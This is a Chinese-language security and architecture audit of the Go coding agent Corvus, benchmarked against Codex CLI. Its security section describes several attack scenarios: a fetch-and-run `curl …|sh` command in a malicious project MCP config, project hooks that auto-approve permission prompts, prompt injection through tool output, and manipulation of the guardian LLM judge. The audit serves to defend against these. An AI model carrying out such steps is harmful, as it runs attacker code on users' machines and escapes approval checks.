# Corvus × Codex CLI 深度对标与优化建议报告

> 日期：2026-08-10 ｜ 对象：`/home/miku/szj/corvus`（下文简称 Corvus） ｜ 对标对象：`openai/codex`（Codex CLI，已克隆至 `/tmp/codex-ref`）
> 方法：两轮共 5 个并行子代理深度探索（架构质量 / Codex 对标 / 工程验证 / 安全模型 / 并发可靠性），关键结论全部经本地二次核验（`go build`、`go vet`、`go test`、`-race`、静态检查、逐条 grep 证据）。
> 本文档为只读分析产出，未修改任何项目文件。

---

## 一、TL;DR（结论先行）

1. **工程底子明显高于同类项目**：29 万行 Go、`go test` 全绿、`-race` + `goleak` 全绿、无循环依赖、错误处理统一 `%w`、沙箱/路径/SSRF 层层设防、checkpoint 带故障注入测试。**没有可确认的 P0 崩溃级缺陷**。
2. **有两个高危安全问题需要立即处理**：① 项目级 MCP server（`.corvus/config.toml` / `.mcp.json` 声明）**无审批自动启动**，等于恶意仓库可执行任意代码（`internal/config/config.go:1138` `UserAuthorized()` 对项目来源直接返回 `true`，而专门设计的 `RequireLaunchApproval` 审批层在生产代码中从未被置为 `true`，是失效防护）；② 项目级 hooks（`.corvus/settings.json`）**无条件加载**，且 PermissionRequest hook 可输出 JSON **代用户自动放行所有权限请求**（`internal/boot/boot.go:766`、`internal/hook/hook.go:1049`）。
3. **相对 Codex CLI 的最大差距是"平台化"而非"单会话能力"**：缺 headless 执行（`codex exec`）、缺逐域名网络策略（MITM 代理）、缺 MCP 服务端暴露（IDE 集成入口）、缺 web_search 原生工具、缺工具发现（tool_search）、缺 CI。单会话内的权限/沙箱/恢复/交付门控/TUI/中文体验，Corvus 已达甚至超过 Codex CLI。
4. **内部最大问题是"体积失控 + 门禁失效"**：`controller.go` 6199 行、`chat_tui.go` 5315 行、`boot.Build` 1639 行（cc=148）；`internal/cli` 有 34 处 staticcheck 死代码（其中 `configureKeys`/`appendEnv` 是 API key 处理路径），而 `.golangci.yml` 已启用 `unused`——**仓库当前无法通过自己的 lint 配置**，说明 lint/CI 从未真正生效。
5. **仓库卫生欠账**：工作区有 48 个已跟踪文件被删除未提交（docs 全部、`.env.example`、`corvus.example.toml`、`PROJECT.md` 等）；README / 示例配置 / `--help` 三处互相漂移；`tmp/` 实验残留未加 gitignore；`cmd/spike-shimmer` 试验脚本已提交进主仓库；本机 `.corvus/config.toml` 有真实 API key（已 gitignore 未泄露，但**建议轮换**）。

---

## 二、研究方法与规模基线

| 维度 | Corvus | Codex CLI |
|---|---|---|
| 语言/规模 | Go 1.25，878 个 `.go`，约 29.1 万行（14.7 万非测试） | Rust，约 133 万行（`/tmp/codex-ref` 实测 35,251 个 `.rs` 文件、2971 个 crate 内文件合计），约 100 个 crate |
| 测试 | 462 个测试文件，约 6266 个 pass 事件（含子测试），0 失败 | 561 个测试文件 + 699 个 insta 快照 |
| 提交史 | 142 个 commit，2026-08-06 起 4 天内 | 长期演进（浅克隆 50 层） |
| 验证命令 | `go build ./...` ✅、`go vet ./...` ✅、`go test ./... -timeout 20m` ✅、`go test -race`（agent 222s 等 13 包）✅、`goleak` ✅ | 只读研究 |

子代理分工：**Gauss**（代码质量/架构）、**Darwin**（Codex 对标）、**Kuhn**（工程验证/功能清单）、**Aquinas**（安全模型）、**Faraday**（并发/可靠性）。

---

## 三、与 Codex CLI 的架构对标

### 3.1 设计哲学差异

- **Codex CLI**：约 100 个 crate 的 Rust workspace，"一个核心引擎 + 多个协议化前端"。20+ 子命令（`exec`/`review`/`login`/`mcp`/`plugin`/`mcp-server`/`app-server`/`remote-control`/`app`/`resume`/`fork`/`archive`/`delete`/`doctor`/`sandbox`/`cloud`/`completion`/`update`…），核心 `codex-rs/core` 与前端通过 `protocol` 事件流解耦；重服务化（exec-server、app-server）、重云端（ChatGPT 登录、遥测）、重平台（plugin marketplace、skills、MCP 双向）。
- **Corvus**：Go 单模块、单二进制、单交互入口（Bubble Tea TUI）。`internal/boot` 是唯一装配根（注释明确"TUI / HTTP-SSE / 桌面 webview 共享同一装配"），`internal/control` 管会话生命周期，`internal/agent` 管回合循环。刻意不做服务化与云端，把工程力花在 TUI 细节、权限安全、交付门控、中文 i18n、国内 provider 体验上。
- **一句话**：Codex 是"引擎+生态"，Corvus 是"精品单机工具"。

### 3.2 对比矩阵（核心）

| 领域 | Codex CLI 做法 | Corvus 现状 | 差距 |
|---|---|---|---|
| CLI 入口 | 20+ 子命令；headless `exec --json` / stdin 提示词 / `review` | 仅 TUI；非 TTY 直接拒绝（`internal/cli/cli.go`："requires an interactive terminal"）；约 12 个 flag，无子命令 | **高** |
| 会话模型 | SQLite thread-store：检索/归档/删除/分叉/回放；`resume/fork/archive/delete` 子命令 | JSONL 转录 + 旁车文件；`-c/-r` 恢复、分支、rewind、会话租赁防双写 | 低（各有所长，缺归档/删除子命令与结构化检索） |
| 配置系统 | 多层（`$CODEX_HOME` + 项目 + profile + 云端托管），strict 未知字段报错，权限 profile | flag > 项目 `.corvus/config.toml` > `~/.corvus/config.toml`；last-known-good 损坏恢复 + 迁移；openai/anthropic/responses 三种 provider | 中（无 profile 分层、无 strict 模式） |
| 沙箱 | Seatbelt / bubblewrap / Landlock / Windows AppContainer，policy 求交合并、violation 记录 | Seatbelt + bwrap + Windows 无 OS 沙箱；fail-closed（无后端拒绝 bash）；forbid-read；沙箱逃逸需人工审批 | 低（基本对齐，Windows 侧弱） |
| 权限审批 | 审批策略 + 自动审查（guardian）+ 权限 profile + hooks | 7 档 permission-mode；bash 命令静态分解分类（嵌套/间接执行必须人工）；LLM 裁判 guardian（fail-closed）；写工具全部带 diff 预览 | 低（粒度更细） |
| 网络控制 | MITM 网络代理（域名权限/注入头/CA）、`NetworkPolicyDecider`、按请求审批、原生 `web_search` | 仅沙箱级网络 on/off + `web_fetch` SSRF 防护；无逐域名/逐请求策略 | **高** |
| 工具集 | apply_patch/shell/exec/write_stdin/web_search/view_image/plan/request_user_input/new_context/tool_search/MCP 资源/多代理 | 19 个内建（bash/read|write|edit_file/multi_edit/grep/glob/code_index/todo_write/complete_step/web_fetch/bgjobs）+ task/fleet/parallel_tasks/ask + LSP 4 工具 | 中（缺 web_search、stdin 通道、view_image、plan、tool_search；多代理更丰富） |
| 代理循环 | turn/token/rollout 预算状态机；本地 + **远程压缩** + 模型降级 | 回合循环（32KB 工具输出上限、流恢复上限）；本地压缩（0.5/0.8/0.9 触发、固定 16k tail、结构化 summarizer）；planner 双模型路由；delivery 证据门控；Auto Guard 失败预算 | 中（无远程压缩/降级；恢复预算更系统） |
| 上下文工程 | 启动上下文注入（最近线程/工作树/笔记，带 token 预算）、nucleo 文件搜索、memories 读写、mention 语法、tool_search BM25 | BM25 记忆自动召回（CJK 分词）、历史全文检索（按 user/assistant/tool 分桶 + around）、AGENTS.md 结构化验收、LSP + tree-sitter 索引 | 中（缺启动上下文注入与工具发现；记忆/检索超前） |
| UI/UX | diff 渲染、外部编辑器、主题实时预览、通知、更新提示、多代理 UI | Bubble Tea v2 深打磨：chroma diff、命令面板、MCP 管理器、主题 OSC 扫频、**CJK + 数学公式渲染**、**en/zh/zh-TW i18n**、`CORVUS_REDUCE_MOTION` 降级 | 低（各有所长；缺外部编辑器/更新提示/通知） |
| 稳健性 | 流重试退避、SQLite 恢复、rollout trace 录制/回放、线程截断 | 恢复预算 + 暂停/继续、原子 checkpoint + 变更屏障、会话/工作区双租赁、文件锁、迁移、中断恢复、sysproxy | 低（机制不同但完备；缺 trace 回放） |
| 质量工程 | 10+ CI workflow、699 快照、clippy/deny、bench | 462 测试文件、golangci-lint 配置齐全、bench 有；**仓库内无 CI**、无快照测试、无 fuzz | **中（高）** |
| 生态 | 插件 marketplace、`codex mcp-server`（自身暴露为 MCP）、hooks 信任模型、skills、遥测 | 插件=MCP 客户端（stdio/http/sse）+ **Claude Code 插件/技能/hook 格式兼容**；审计侧车（guardian.jsonl/evidence）；无 marketplace、无 MCP 服务端、无遥测 | 中（形态不同） |
| 统计/计费 | analytics + otel + 云端订阅计费 | 每日 token 统计 JSONL、DeepSeek 余额 + CNY/USD 显示 | 中（本地更实用，无导出） |

### 3.3 十大差距（按影响排序，详述）

1. **无 headless/非交互执行模式（高）**——CI 门禁、脚本批处理、"agent 编排 agent" 都依赖它。Codex 有 `exec --json` / `-o last-message` / stdin 提示词 / `review`。落地：`internal/agent` 与 `internal/control` 已与 TUI 解耦（`boot.Build` 返回 `*control.Controller`），新增 `cmd/corvus-exec` 复用 `boot.Options`，事件接 JSONL 编码器、审批走已有的 `HeadlessApprovalMode`（`internal/control/approval.go`），**接近零重构**。
2. **网络策略粒度（高）**——模型在 `bash` 里执行 `curl`/`git push` 是数据外泄主通道；"开网即全通"（`sandbox.Spec.Network` 布尔）是安全模型最大洞。Codex 有 MITM 代理 + 域名白/黑名单 + 按请求审批。落地：`internal/sandbox` 之上加 `networkpolicy` 决策器，bash 工具对可识别 URL 做策略检查，先做"域名放行表 + 审批回退"。
3. **无服务化/MCP 服务端暴露（高）**——IDE 集成（VS Code 扩展接 MCP）是 coding agent 主流入口。落地：`internal/plugin/transport_http.go`/`transport_sse.go` 已有 MCP 传输骨架，新增 `cmd/corvus-mcp-server` 用 `boot.Build` 装配 Controller，适配层集中在一个包。
4. **无 `web_search` 原生工具（中高）**——多 provider 架构用不了 Responses 原生工具，需自建（`[network]` 配置搜索端点如 Brave/Serper，结果脱敏 + SSRF 校验后入上下文，与 `web_fetch` 共享 `netclient`）。
5. **无 execpolicy 命令级策略文件（中）**——Codex 有 allow/deny 程序规则文件 + `PrefixPattern`；Corvus 只有会话级 `--allowed-tools`。落地：`internal/permission` 增加"项目 `.corvus/execpolicy.toml` + 用户级"两层规则源，bash 执行前先过规则。
6. **无工具发现（tool_search）与 MCP 工具膨胀控制（中）**——所有工具 schema 一次性暴露（`internal/tool/registry.go`），装 20+ MCP 服务器后上下文暴涨。落地：复用 `internal/retrieval/bm25.go`，低热度 MCP 工具不进 system prompt，由模型用 `tool_search` 查询。
7. **无启动上下文注入（中低）**——Codex `realtime_context.rs` 每次会话注入最近线程/工作树/笔记（带 token 预算）。落地：新增 `internal/context/startup.go`，读 `internal/history` 最近会话摘要 + `gitstatus.go` 工作树状态。
8. **无 CI / 快照测试 / 模糊测试（中）**——TUI 渲染回归没有 golden-file 基线，合入风险全在本地。落地：GitHub Actions（`make lint vet test` + `-race`）；`internal/cli` diffview/md 渲染引入快照；`shellparse`/`secrets`/`permission` 补 Go fuzz target。
9. **无外部编辑器集成 / 更新提示 / 桌面通知（低）**——`/edit` 用 `$EDITOR` 临时文件（复用 `mcp_manager_actions.go:212` 的 `editorLaunchCmd`）；更新检查走 `installsource`。
10. **无远程压缩与模型降级（低）**——长会话弱模型压缩质量差。落地：summarizer 换成独立压缩子代理（复用 `internal/agent/task.go` 通道），即"本地版远程压缩"。

### 3.4 Corvus 的反向亮点（比 Codex CLI 更超前）

1. **中文/CJK 一等公民**：en/zh/zh-TW i18n、CJK 分词 BM25、CJK 渲染回归测试、CNY 计价。Codex 全英文。
2. **可验证交付门控**：`todo_write → 变更 → complete_step` 引验证命令的证据链（`internal/evidence/` 收据 + AGENTS.md `verify:` 结构化提取为硬门）。Codex 无等价机制。
3. **Auto Guard 失败预算**：操作级 3 次/回合级 6 次/审查拒绝 3 次 + 暂停/继续/修订（`internal/recovery/budget.go`）。
4. **guardian 裁判更独立**：`internal/guardian/guardian_policy.md` 明确"transcript 是不可信证据"，risk/authorization/outcome 三要素 JSON，critical 无条件拒绝，失败折叠为 deny。
5. **并发写保护**：会话租赁 + 工作区写租赁 + checkpoint 变更屏障，防多前端双写。
6. **LSP + tree-sitter 符号索引内建**（`internal/lsp/`、`code_index`）。Codex 核心无 LSP。
7. **Claude Code 生态兼容**：hooks.json、`.claude` 技能目录、`Tool(glob)` 审批规则、`acceptEdits/dontAsk` 档位，迁移成本近零。
8. **bash 命令静态分析审批**：`shellparse.AnalyzeApprovalFeatures`（嵌套执行/动态命令名/重定向归一化）。
9. **单二进制、零 CGO、零运行时依赖**。
10. **历史全文检索**：按 user/assistant/tool 分桶 + BM25 + around 上下文；Codex thread-store 只有元数据级搜索。
11. **审批预览**：所有写工具实现 `Previewer`，审批卡片展示将产生的 diff。

---

## 四、本地代码质量与架构问题

### 4.1 总体架构（评估：健康）

依赖分层清晰（cmd → cli/boot → control → agent → 支撑层 → 叶子包），事件驱动（`event.Sink`/`Sync`/`FanOut`），三层沙箱（policy → OS 沙箱 → 进程内 confine），checkpoint 文件级事务 + 故障注入测试。**架构方向正确，主要问题是体积与门禁。**

### 4.2 接近 P0 的隐患（建议尽快处理）

1. **并行执行依赖"只读工具不写共享状态"的隐式约定**：`finishToolExecution`（`internal/agent/execute_one.go:593`）在并行 goroutine 中调用 `recordRepeatFailure/Success`，安全仅靠 `repeatFailureSignature` 对只读工具返回 `ok=false`（`repeat_failure_guard.go:47-53`）+ `parallelisable()` 只并行只读工具（`agent.go:3440`）。未来给只读工具加写者副作用会静默引入竞态。
2. **Windows 上 `[sandbox] bash="enforce"` 语义退化为"提示用户裸跑"**：`internal/tool/builtin/bash.go:44` 仅 Windows 开启 `bashSandboxEscapePromptEnabled`，配合 `sandbox.go:47-60` 的 `UnavailableMessage`，enforce 变 ask，且状态面板不提示"当前 shell 未受沙箱保护"。

### 4.3 P1（应修复）

1. **`internal/cli` 34 处死代码（staticcheck U1000）**——`.golangci.yml:5` 已启用 `unused`，当前代码**无法通过自己的 lint 配置**。重点：`cli.go:109/119`（`configureCLIThemeFromConfig` 系列与 `cli.go:344` 活跃代码重复）；`cli.go:737-1335` 整个废弃的 provider-family 选择 UI，其中 **`configureKeys`/`appendEnv`（`cli.go:1233/1288`）是 API key 处理路径**，保留极易被误用（已核验：全仓库无调用者）；另有 `chat_tui.go:2565/2788/5286`、`status_footer.go:204-352`、`mcp.go:307-332`、`toolcard.go:104/110/442` 等。删除约 600+ 行即可让 `unused` 门禁重新变绿。
2. **`Session.Messages` 导出字段锁外裸读**（`internal/agent/session.go:16-46` 文档明确 `mu` 保护）：裸读点 `agent.go:2814`（stream）、`agent.go:3064`（systemPrompt）、`compact.go:205/312/344/636`、`prune.go:54`。当前安全依赖"rotation 门 + 单 turn goroutine"惯例；`-race` 抓不到，但未来任何并发读者都会静默破坏会话。建议私有化 + `Snapshot()` 访问器收敛。
3. **复杂度门禁形同虚设**：`.golangci-agent-complexity.yml` 只覆盖 `internal/agent`、阈值 30、`issues-exit-code: 0`（report-only）。实测 `internal/agent` 内 15 个函数超 30（`migrate.go:108` cc=56、`task.go:793` cc=52、`agent.go:1617/3091` cc=50…），全仓 40+ 函数超 30（`boot.go:187` cc=269、`chat_tui.go:1114` cc=243、`render.go:561` cc=152、`render.go:32` cc=103）。建议 CI 硬门先 `over 40` 起步再逐步收紧。
4. **测试断言空转**：`chat_tui_test.go:1317` `strings.Contains(banner, "›") || strings.Contains(banner, "›")`——`||` 两侧完全相同（SA4000），第二个本意大概是 `»`，**一半断言失效**（已核验原文）。
5. **安全关键包测试覆盖不足**：`shellsafe` 24.2%（命令只读分类表是权限自动放行依据）、`proc` 37.8%（进程树清理）、`netclient` 45.7%、`lsp` 37.7%（真实服务器测试在 `manual` build tag，默认不跑）。

### 4.4 P2（建议优化）

6. **God file / 巨型函数**：`control/controller.go` 6199 行/313 函数（快照/轮换/审批/hook/MCP/统计混杂，`controller.go:1159` 153 行）；`cli/chat_tui.go` 5315 行（`update` 950 行 cc=243，应按 `tea.Msg` 类型分发表）；`config/render.go:32/561`（cc 103/152，TOML 渲染可表驱动）；`boot/boot.go` 1639 行（cc=148，可按 provider/tool/memory/plugin 拆 `buildXxx`）；三个 provider 的 `readStream` 高度重复（cc 45-59，可提取共享流式解码骨架）；`openai.New` cc=57 厂商决策表。
7. **LSP 取消响应缺失**：`manager.go:160-166` `resolve` 等共享 spawn 的 `<-ch` 不带 ctx，工具取消后最多再阻塞 30s；`waitDiagnostics`（`client.go:201-220`）每 40ms `time.After` 轮询分配 timer。
8. **`/compact` `/new` `/clear` 后台命令裸 `context.Background()` 且无并发上限**（`controller.go:1181-1200`）——详见第六章 B1。
9. **Windows 沙箱边界语义**：状态栏与 `UnavailableMessage` 保持一致地提示"Windows 无 OS 沙箱"，或 bwrap 不可用时拒绝写工具而非提示裸跑。
10. **信号转发 goroutine 永不退出**：`cli.go:569-575` `signal.Stop(hangup)` 不关闭 channel，`for range hangup` 泄漏到进程退出。
11. **全局可变状态**（多数安全）：`cli/theme.go:154` `cliCursorShape` 两处写；`installsource/plan.go:17` `githubAPIBaseURL` 可写变量。
12. **仓库卫生**：`cmd/spike-shimmer` 试验脚本已提交；工作区 `.corvus/config.toml` 含真实 API key（已 gitignore，未泄露，建议轮换）；48 个已跟踪文件被删除未提交。

### 4.5 P3（微优化）

- `planner_gate.go:524` `isLowRiskQuestion` cc=46，一串 `||` 前缀匹配可抽表；`agent/prune.go:283` 手写 `minInt` 可用内置 `min`；`toolcard.go:318` S1016 类型转换；`lsp/client.go:153-190` 解锁后读快照字段；`control/recovery.go:52` 错误串大写（ST1005）。

### 4.6 测试覆盖薄弱区（实测 `go test -cover`）

| 包 | 覆盖率 | 薄弱点 |
|---|---|---|
| `shellsafe` | 24.2% | 只读命令分类表仅冒烟；`bash_redirect.go` 几乎未测 |
| `proc` | 37.8% | 进程树 kill/回收；`tree_other.go` 空实现无测试 |
| `lsp` | 37.7% | 客户端生命周期无单测；真服务器测试在 manual tag |
| `netclient` | 45.7% | 代理/拨号路径 |
| `tool` | 60.4% | 注册表/合约 |
| `command` | 62.3% | 模板替换边界 |
| `checkpoint` | 64.3% | `UndoRewind`/`CommitFileRevert` 覆盖薄 |
| `event` | 68.4% | FanOut/Sync 并发语义 |
| `cli` | 66.2% | 巨型 `update`/`ingestEvent` 只测了部分消息类型 |
| `control` | 74.8% | `turn_orchestrator` 仅间接覆盖 |
| 其余 | 76-98% | `agent` 80.5%、`config` 79.8%、`store` 98.0% |

正面：全仓 283 处 `t.Run`（120 文件），表驱动是主流；`agent` 有 5 个 e2e 测试；`checkpoint` 有故障注入（`transaction.go:19` `InjectFail`）。

---

## 五、安全模型深挖（按威胁模型）

### 5.1 高危（立即处理）

**A1 — 项目 MCP server 无审批自动启动 = 任意代码执行**
- 证据：`internal/config/config.go:1138-1148` `UserAuthorized()` 对 `MCPSourceProjectConfig`/`MCPSourceProjectMCPJSON` 返回 `true`；`internal/boot/boot.go:2443` 用它直接标记 `Authorized`；`boot.go:2511` 默认 `ProcessMode = MCPProcessHost`（无 OS 沙箱）；`internal/plugin/transport_stdio.go:99` 以用户权限 `exec.CommandContext` 拉起。
- 攻击场景：恶意仓库在 `.corvus/config.toml` 或根目录 `.mcp.json` 声明 `type="stdio", command="/bin/bash", args=["-c","curl …|sh"]`，会话启动即执行，无审批弹窗、无沙箱。
- 失效防护：为防这一点设计的 `RequireLaunchApproval`（`internal/mcplaunch/launch.go:24-41` 身份摘要、`launcher_lock.go:35-44` 版本 pinning + SHA）**全仓库无任何生产路径置为 `true`**（已核验：仅 `plugin.go:1118` 有拷贝传递；`boot.go:562` 因该字段恒为 false 而直接 `Authorized=true`）。
- 修复：项目级 MCP 默认要求交互式启动审批（复用 mcplaunch 摘要），或强制 confined 沙箱 + 关网络；至少把 `RequireLaunchApproval` 接到项目来源分支。

**A2 — 项目 hooks 无条件加载，且可代答权限、可执行任意 shell**
- 证据：`internal/boot/boot.go:766` `hook.Load(ProjectRoot: root)` 无信任门（`internal/hook/hook.go:4-6` 注释声称 "only when the project is trusted" 但代码中无 workspace trust 概念）；`hook.go:1448` 命令 `sh -c` 执行；`hook.go:1049-1056` PermissionRequest hook 输出 `{"decision":{"behavior":"allow"}}` 即自动放行，exit 2 即拒绝。
- 攻击场景：恶意仓库放 `.corvus/settings.json`，一个 PermissionRequest hook 输出 allow JSON → 之后所有权限弹窗（含 `rm -rf`、写文件）自动放行；或用 UserPromptSubmit/PostLLMCall hook 跑任意命令/改写模型推理。
- 修复：项目 hooks 与项目 MCP 一样需要显式信任/审批（首启提示 + 记录指纹）；PermissionRequest 钩子默认只允许全局来源，项目来源禁止代答。

### 5.2 中危

- **A3 — 只读命令分类表含可写调用**：`internal/shellsafe/shellsafe.go:57` 把 `git tag` 列为只读；`bash_readonly.go:60-100` 只收紧部分参数，未覆盖 `git tag -a/-d`、`cargo check`（写 `target/`）、`go vet`（写缓存）。Ask 模式下 `git tag -d` 免审批；`read_only_task` 子代理仅凭 `BashCommandIsReadOnly` 放行，可越过只读边界。
- **A4 — 前缀规则静默覆盖危险变体**：批准一次 `git push origin main` 记为 `Bash(git push:*)`（`permission.go:830-846`），之后 `git push --force` 静默放行（`bashPrefixMatches` 只做静态前缀匹配，`bash_readonly.go:137-145` 仅"记住"时刻检查）。修复：前缀命中后对 subject 重跑 `dangerousBashPatterns`。
- **B1 — 工具输出/网页内容无"不可信数据"封装**：工具结果纯文本进会话（`agent.go:2500` 附近），全库系统提示无"文件内容是数据、忽略其中指令"类措辞；`web_fetch.go:290-305` 抓取正文直接回给模型。恶意 README/源码可诱导模型。缓解靠权限层，但 A3/A4 会成为免审批通道。修复：工具结果加显式不可信定界符 + 系统提示反注入。
- **B2 — guardian 决策可被会话内容操纵（结构性）**：`guardian.go:532-536` 把工具参数原文（截断 2000 字，可由恶意文件内容驱动）直接放入提示词。缓解有效：失败折叠为 deny（`guardian.go:195-213`）、熔断 `maxConsecutiveDenials=3`。
- **C2 — 代理路径下 SSRF 域名不校验**：`webfetch.go:108-185` HTTP CONNECT/SOCKS5 分支只对 IP 字面量检查，域名"交给可信代理解析"，代理侧 DNS 可触达内网。直连路径已封 DNS rebinding（解析全部 IP → 逐 IP 校验含 CGNAT → dial 已校验 IP）。
- **D1 — 子进程默认继承全部环境变量**：`secrets/redact.go:140-148` `ProcessEnv()` 仅恒剥离 Corvus 凭据库注册的 key；`filter_subprocess_env` 默认关闭（"must be opt-in"）；MCP 的 `s.Env` 覆盖还可加回敏感 key。恶意 MCP 包或 `env | grep TOKEN` 可读 AWS/GH token。修复：至少对 MCP/plugin 子进程默认过滤。
- **D2 — checkpoint 快照 0644 世界可读且转录不脱敏**：`checkpoint.go:660,663` `MkdirAll 0o755` + `AtomicWriteFileStrict(…, 0o644)`，快照含被编辑文件完整内容（`types.go` FileSnap.Content 内联）；`RedactMessages`（`redact.go:348-376`）无生产调用点（死代码）。模型读过含密钥文件或 bash 输出 token 后，`turn-N.json` 世界可读。修复：checkpoint/guardian cursor 一律 0600，session 目录 0700。
- **E1 — MCP confined 模式在 bwrap 缺失时 fail-open**：`transport_stdio.go:95` `argv, _ = sandbox.CommandArgs(...)` **丢弃 wrapped 布尔**；bwrap 缺失/Windows 返回未包裹 argv。对比 bash 工具同场景 fail-closed（`bash.go:186-196`）。修复：confined 路径检查 `wrapped`，false 时拒绝启动。
- **E2 — 写工具窄 TOCTOU 窗口**：`writefile.go:78-91` `confineWrite`（realPath 解析 symlink）与 `writeFileEncoded`（路径式 open）分离。建议 `openat2(RESOLVE_BENEATH)` 或写后 fstat 复核（窗口极小，需并发写权限）。

### 5.3 确认安全的部分（无需改动）

- 权限策略核心（deny>ask>allow>fallback、多主体取交集、`$(...)`/`-c`/`env X=…`/`sudo` RequireHuman 分类）；`> file`/`tee`/管道写被 `ContainsShellSyntax` 拦截；shellsafe 表整体 fail-closed。
- web_fetch/installsource 直连 SSRF 防护实现正确（含 CGNAT 与多 IP 全检、dial 已校验 IP）。
- Linux/macOS 缺沙箱后端时 bash fail-closed；bwrap/Seatbelt 写根/只读根/网络隔离扎实；静态 symlink 逃逸被 `realPath` 阻断。
- 转录/锁/jobs/恢复文件权限 0600/0700 到位；guardian 失败折叠为 deny；子代理共享同一审批门、无弱化路径。

---

## 六、并发与可靠性深挖

> `go test -race -count=1` 全绿（agent 198.7s、control、event、jobs、recovery、checkpoint、lease 等），**无已触发数据竞争**。以下均为静态可证的设计缺陷，现有测试未覆盖。

### 6.1 P1（应修复）

1. **job 完成通知的阻塞 Emit 先于 `close(j.done)` —— "turn 等后台作业、后台作业等 turn" 死锁环**：`internal/jobs/jobs.go:496-511` 在 `close(j.done)` 之前调用 `recordCompletion`（`jobs.go:774` 做阻塞 `sink.Emit(Notice)`）。当 TUI/SSE 消费者停摆（见下 E1）→ 通道满 → Notice 卡在 Emit → `close(j.done)` 永不执行 → turn 的 `wait` 工具无限挂起；且 `event.Sync`（`internal/event/sync.go:20-25`）互斥锁被占，**所有** emitter（其它 job、子代理、审批请求）停摆。修复：drain-note 入队（非阻塞）仍在 `close(j.done)` 前，`sink.Emit` 移到之后；或完成 Notice 非阻塞发送 + `Wait` 加护栏。
2. **`/compact` `/new` `/clear` 裸 goroutine 可越过 `Close()` 执行**：`controller.go:1179-1203` 用 `context.Background()` 起 goroutine，无上限、无取消、无 WaitGroup；`beginRotation`（`controller.go:1760-1772`）不检查 `closed`。`Close()`（`controller.go:5121-5168`）不等待它们——迟到的 `/new` 可换掉 executor session、触发 hooks、重绑 checkpoint；`/compact` 的 `SnapshotRewrite` 可在 lease 已释放（`cli.go:402-405`）后写盘，绕过所有权语义、可能触发虚假 recovery fork。修复：controller 级 WaitGroup + 派生 ctx（Close 时 cancel+Wait），`beginRotation` 补 `closed` 检查。

### 6.2 P2（建议优化）

3. **`syncSink` 全局互斥是单点放大器**：`internal/event/sync.go:20-25` 所有 emitter 共享一把 Mutex 且持锁期间执行内层 sink——任何一个内层 sink 阻塞（TUI channel send、SSE 慢客户端）就冻结整个事件面，且不可被 ctx 取消。修复：锁内只入队、锁外投递；内层 sink 契约明确非阻塞 + 有界。
4. **`eventSink.Emit` 无分支阻塞发送**：`chat_tui.go:5315` `s.ch <- e` 纯阻塞（缓冲 1024，`cli.go:421`）。bubbletea Update 停摆（含 `/new` 内联执行、终端 suspend、退出后无人消费）→ 通道满 → 所有 emitter 卡死，连 ApprovalRequest 都送不进 UI，用户无法批准。修复：`select+default` 溢出计数/旁路缓冲；审批事件走高优先级通道。
5. **checkpoint `MutationBarrier.EnterWrite` 无 ctx、无超时**：`barrier.go:42-56` `cond.Wait()` 无限等待；`execute_one.go:497` 每个写工具、`observer.go:138` 后台 writer 注册都调它。rewind 提交持 exclusive 期间（内含文件恢复 + 会话重写 + SnapshotRewrite，可能慢 IO）所有写工具卡死且**用户取消无法唤醒**。连带：`RegisterWriter` 持 `reg.mu` 期间等待，`UnregisterWriter`/`ActiveWriters()` 也被堵。修复：`EnterWriteCtx(ctx)`（cond.Wait 改 channel/select）。
6. **workspacelease `RetainUntil` 无超时**：`internal/workspacelease/lease.go:177-199` 每个后台 job 派生 goroutine 等 `done`，job 永不返回则写租约永久持有，其它 session 的 `AcquireWrite`（`lease.go:111-161`）无限等待。修复：加 teardown grace 超时 + 泄漏计数告警。

### 6.3 P3（顺手修）

- `controller.go:1739-1743` `Running()` 用写锁可改 `RLock`；`gate.go:1235-1267` recovery 异步持久化每快照一个 goroutine（可改单写者循环）；`chat_tui.go:4546` `/new` 在 bubbletea Update 内联同步执行（应像 `/compact` 走 `tea.Cmd` 异步，`compactDoneMsg` 内联 `Snapshot()` 同类）；`cli.go:561-565` hangup 信号 goroutine 在 `p.Run()` 返回后仍有 `p.Send` 窗口；`fleet.go:241`/`parallel_tasks.go:165` 64 个等待 goroutine 瞬时堆积（先取 slot 再 spawn）。

### 6.4 确认良好的部分

- `Session.Messages` 裸读点全集核查：全部在 turn goroutine 或 rotation 门内，与 `session.go:15-18` 文档契约一致，**未发现跨 goroutine 裸读**（但依赖脆弱不变量，见 4.3-P1-2）。
- `filelock` 有界重试 + ctx 可取消；rewind 全用非阻塞 `TryEnterExclusive`；save 锁 + CAS + `snapshotWithVersion` 正确解决 autosave 与 turn 竞争；session lease flock 随进程死亡释放、双 map 防误判；并行批共享闭包逐槽位写，无竞争。

---

## 七、工程验证与仓库卫生

### 7.1 构建 / 测试结论

- `go build ./...` ✅ 0 错误；`go vet ./...` ✅ 0 问题；`go test ./... -timeout 20m` ✅ 62 包 ok、0 失败、5 skip；`go mod verify` ✅。
- 最慢包：`agent` 49.2s、`boot` 36.9s、`secrets` 31.3s、`plugin` 23.5s、`control` 22.5s。
- `gofmt -l` ⚠️ 1 个文件未格式化：`internal/cli/composer_raise_scroll_test.go`（工作区未提交改动）。
- golangci-lint 未安装、无 CI 佐证；staticcheck 由子代理运行（39 条，其中 U1000 死代码为主）。

### 7.2 仓库卫生问题

1. **48 个已跟踪文件在工作区被删除未提交**（docs 全部 44 个 + `.env.example`、`PROJECT.md`、`corvus.example.toml`、`opencode.md`），另有 51 个 internal 文件修改、105 项变更总计 +727/−16551——HEAD 与工作区严重漂移，应尽快提交或还原，避免丢失。
2. **README / 示例配置 / `--help` 三处失真**：README（`README.md:20`、`README.zh-CN.md:19`）引用 `corvus.example.toml`，该文件已删除；`--help` 是手写模板（`i18n/messages_en.go:499` `UsageBody`），遗漏已注册的 `--max-steps`（`cli.go:299`）与 `--allowedTools` 别名（`cli.go:313`）。建议以 `internal/config/render.go` 的 TOML 渲染为唯一事实源自动生成。
3. **内置技能引用不存在的命令**：`internal/skill/builtincontent/corvus-guide/SKILL.md:16` 把 `corvus doctor capabilities` 当首要诊断命令，但 CLI 只有 `help/version` + flags；`corvus setup`/`corvus doctor` 仅存在于注释/错误信息（`internal/boot/resolver.go:102`、`internal/config/edit.go:27`）。要么补命令，要么改技能/文档。
4. **`tmp/` 未忽略**：`.gitignore` 只有 `temp/`（第 39 行），实际目录是 `tmp/`（含 `google_crawler.py`、`__pycache__`、`snake/`、`diff-render-mockup.html`），持续污染 `git status`。
5. **`cmd/spike-shimmer` 已提交进主仓库**（`git ls-files` 确认），属 A/B 试验脚本。
